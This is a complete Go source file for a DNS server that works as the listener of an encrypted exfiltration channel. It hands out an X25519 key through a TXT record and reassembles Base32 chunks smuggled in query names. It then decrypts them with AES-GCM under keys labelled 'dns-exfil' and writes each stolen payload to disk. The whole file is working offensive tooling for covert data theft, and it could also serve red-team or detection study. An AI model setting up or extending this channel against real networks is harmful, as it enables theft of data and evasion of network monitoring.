package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/ecdh"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base32"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/joho/godotenv"
	"github.com/miekg/dns"
	"golang.org/x/crypto/hkdf"
)

const (
	defaultTTL      = 60
	cleanupInterval = time.Minute
	sessionTTL      = 10 * time.Minute
)

type sharedKey struct {
	aesKey  []byte
	hmacKey []byte
}

type Server struct {
	domain     string
	outputDir  string
	privKey    *ecdh.PrivateKey
	pubKeyB32  string
	fragments  map[string]map[int]string
	lastSeen   map[string]time.Time
	sharedKeys map[string]sharedKey
	keyBuffers map[string][]string
	mu         sync.Mutex
}

func main() {
	_ = godotenv.Load()

	port := flag.Int("port", 5300, "UDP port to listen on")
	domain := flag.String("domain", "xf.example.com", "Delegated DNS domain")
	outDir := flag.String("output-dir", "output", "Directory to write output files")
	privPath := flag.String("server-key", os.Getenv("SERVER_PRIVATE_KEY"), "Path to X25519 private key file")
	pubPath := flag.String("server-pubkey", os.Getenv("SERVER_PUBLIC_KEY"), "Path to X25519 public key file")
	flag.Parse()

	if *privPath == "" || *pubPath == "" {
		log.Fatal("server-key and server-pubkey must be provided")
	}

	privKey, err := loadPrivateKey(*privPath)
	if err != nil {
		log.Fatalf("failed to load private key: %v", err)
	}

	pubB32, err := loadPublicKeyB32(*pubPath)
	if err != nil {
		log.Fatalf("failed to load public key: %v", err)
	}

	srv := &Server{
		domain:     *domain,
		outputDir:  *outDir,
		privKey:    privKey,
		pubKeyB32:  pubB32,
		fragments:  make(map[string]map[int]string),
		lastSeen:   make(map[string]time.Time),
		sharedKeys: make(map[string]sharedKey),
		keyBuffers: make(map[string][]string),
	}

	go srv.cleanupStale()

	dns.HandleFunc(".", srv.ServeDNS)

	addr := fmt.Sprintf(":%d", *port)
	server := &dns.Server{Addr: addr, Net: "udp"}
	log.Printf("Listening on UDP/%d for domain %s...", *port, *domain)
	if err := server.ListenAndServe(); err != nil {
		log.Fatalf("DNS server failed: %v", err)
	}
}

// loadPrivateKey reads an X25519 private key from file.
func loadPrivateKey(path string) (*ecdh.PrivateKey, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, fmt.Errorf("read private key %q: %w", path, err)
	}
	return ecdh.X25519().NewPrivateKey(data)
}

// loadPublicKeyB32 reads an X25519 public key and returns its Base32 encoding.
func loadPublicKeyB32(path string) (string, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return "", fmt.Errorf("read public key %q: %w", path, err)
	}
	pub, err := ecdh.X25519().NewPublicKey(data)
	if err != nil {
		return "", fmt.Errorf("parse public key: %w", err)
	}
	b32 := base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString(pub.Bytes())
	return b32, nil
}

// ServeDNS handles incoming DNS requests.
func (s *Server) ServeDNS(w dns.ResponseWriter, r *dns.Msg) {
	if len(r.Question) == 0 {
		_ = w.WriteMsg(new(dns.Msg).SetRcode(r, dns.RcodeFormatError))
		return
	}

	q := r.Question[0]
	qname := strings.TrimSuffix(q.Name, ".")
	if !strings.HasSuffix(strings.ToLower(qname), strings.ToLower(s.domain)) {
		_ = w.WriteMsg(new(dns.Msg).SetRcode(r, dns.RcodeRefused))
		return
	}

	expected := fmt.Sprintf("public.%s", s.domain)
	reply := new(dns.Msg)
	reply.SetReply(r)

	if strings.EqualFold(qname, expected) {
		if q.Qtype == dns.TypeTXT {
			reply.Answer = append(reply.Answer, &dns.TXT{
				Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 300},
				Txt: []string{s.pubKeyB32},
			})
		} else {
			sans := &dns.SOA{
				Hdr:    dns.RR_Header{Name: s.domain + ".", Rrtype: dns.TypeSOA, Class: dns.ClassINET, Ttl: 300},
				Ns:     "ns1." + s.domain + ".",
				Mbox:   "hostmaster." + s.domain + ".",
				Serial: 1, Refresh: 3600, Retry: 900, Expire: 604800, Minttl: 86400,
			}
			reply.Ns = append(reply.Ns, sans)
		}
		if err := w.WriteMsg(reply); err != nil {
			log.Printf("failed to write TXT response: %v", err)
		}
		return
	}

	// handle key exchange or data chunk
	prefix := qname[:len(qname)-len(s.domain)-1]
	parts := strings.SplitN(prefix, "-", 4)
	if len(parts) != 4 {
		return
	}
	id, idx, total, payload := parts[0], parts[1], parts[2], parts[3]

	if idx == "0" && total == "0" {
		s.handleKeyExchange(id, payload)
	} else {
		s.handleDataChunk(id, idx, total, payload)
	}

	// A-record ACK
	reply.Answer = append(reply.Answer, &dns.A{
		Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: defaultTTL},
		A:   net.ParseIP("192.0.2.1"),
	})
	if err := w.WriteMsg(reply); err != nil {
		log.Printf("failed to write A response for %s: %v", q.Name, err)
	}
}

// handleKeyExchange collects fragments of the client's public key.
func (s *Server) handleKeyExchange(id, fragment string) bool {
	s.mu.Lock()
	defer s.mu.Unlock()

	s.keyBuffers[id] = append(s.keyBuffers[id], strings.Split(fragment, ".")...)
	b32 := strings.Join(s.keyBuffers[id], "")
	if len(b32) < 52 {
		return false
	}
	padded := padBase32String(b32)
	raw, err := base32.StdEncoding.DecodeString(padded)
	if err != nil {
		log.Printf("[%s] Base32 decode failed: %v", id, err)
		return false
	}
	aesKey, hmacKey, err := deriveSharedKey(s.privKey, raw)
	if err != nil {
		log.Printf("[%s] deriveSharedKey error: %v", id, err)
		return false
	}
	s.sharedKeys[id] = sharedKey{aesKey, hmacKey}
	s.lastSeen[id] = time.Now()
	log.Printf("[%s] Session keys established", id)
	return true
}

// handleDataChunk stores chunk and processes when complete.
func (s *Server) handleDataChunk(id, idxStr, totalStr, fragment string) {
	s.mu.Lock()
	defer s.mu.Unlock()

	idx := parseInt(idxStr)
	total := parseInt(totalStr)
	if s.fragments[id] == nil {
		s.fragments[id] = make(map[int]string)
	}
	s.fragments[id][idx] = fragment
	s.lastSeen[id] = time.Now()
	if len(s.fragments[id]) != total {
		return
	}

	// assemble fragments
	parts := make([]string, total)
	for i := 0; i < total; i++ {
		parts[i] = s.fragments[id][i]
	}
	b32 := strings.Join(parts, "")
	padded := padBase32String(b32)
	raw, err := base32.StdEncoding.DecodeString(padded)
	if err != nil {
		log.Printf("[%s] decode payload: %v", id, err)
		return
	}
	pl, tag := splitPayloadAndTag(raw)
	key := s.sharedKeys[id]
	if !verifyHMAC(pl, tag, key.hmacKey) {
		return
	}
	plaintext, err := decryptAESGCM(key.aesKey, pl)
	if err != nil {
		log.Printf("[%s] decryptAESGCM: %v", id, err)
		return
	}
	if err := os.MkdirAll(s.outputDir, 0o755); err != nil {
		log.Printf("mkdir %q: %v", s.outputDir, err)
	}
	filePath := fmt.Sprintf("%s/%s.bin", s.outputDir, id)
	if err := os.WriteFile(filePath, plaintext, 0o644); err != nil {
		log.Printf("write file: %v", err)
	} else {
		log.Printf("[%s] File written: %s", id, filePath)
	}
}

// deriveSharedKey performs ECDH and HKDF to produce AES and HMAC keys.
func deriveSharedKey(priv *ecdh.PrivateKey, clientPub []byte) ([]byte, []byte, error) {
	pubKey, err := ecdh.X25519().NewPublicKey(clientPub)
	if err != nil {
		return nil, nil, err
	}
	secret, err := priv.ECDH(pubKey)
	if err != nil {
		return nil, nil, err
	}
	reader := hkdf.New(sha256.New, secret, nil, []byte("dns-exfil"))
	material := make([]byte, 48)
	if _, err := io.ReadFull(reader, material); err != nil {
		return nil, nil, fmt.Errorf("hkdf expansion: %w", err)
	}
	return material[:32], material[32:], nil
}

// decryptAESGCM decrypts nonce||ciphertext+tag blob.
func decryptAESGCM(key, blob []byte) ([]byte, error) {
	if len(blob) < 12 {
		return nil, fmt.Errorf("ciphertext too short")
	}
	nonce, data := blob[:12], blob[12:]
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	return gcm.Open(nil, nonce, data, nil)
}

// verifyHMAC checks payload integrity.
func verifyHMAC(payload, tag, key []byte) bool {
	expected := hmac.New(sha256.New, key)
	expected.Write(payload)
	if !hmac.Equal(expected.Sum(nil), tag) {
		log.Println("HMAC verification failed")
		return false
	}
	log.Println("HMAC verification succeeded")
	return true
}

// padBase32String adds '=' padding.
func padBase32String(s string) string {
	pad := (8 - len(s)%8) % 8
	return strings.ToUpper(s) + strings.Repeat("=", pad)
}

// splitPayloadAndTag separates raw bytes.
func splitPayloadAndTag(raw []byte) ([]byte, []byte) {
	n := len(raw)
	if n < 32 {
		return nil, nil
	}
	return raw[:n-32], raw[n-32:]
}

// parseInt is a helper for Atoi.
func parseInt(s string) int {
	i, _ := strconv.Atoi(s)
	return i
}

// cleanupStale periodically removes expired sessions.
func (s *Server) cleanupStale() {
	ticker := time.NewTicker(cleanupInterval)
	defer ticker.Stop()
	for range ticker.C {
		now := time.Now()
		s.mu.Lock()
		for id, ts := range s.lastSeen {
			if now.Sub(ts) > sessionTTL {
				delete(s.fragments, id)
				delete(s.sharedKeys, id)
				delete(s.keyBuffers, id)
				delete(s.lastSeen, id)
				log.Printf("[%s] Session expired and cleaned up", id)
			}
		}
		s.mu.Unlock()
	}
}
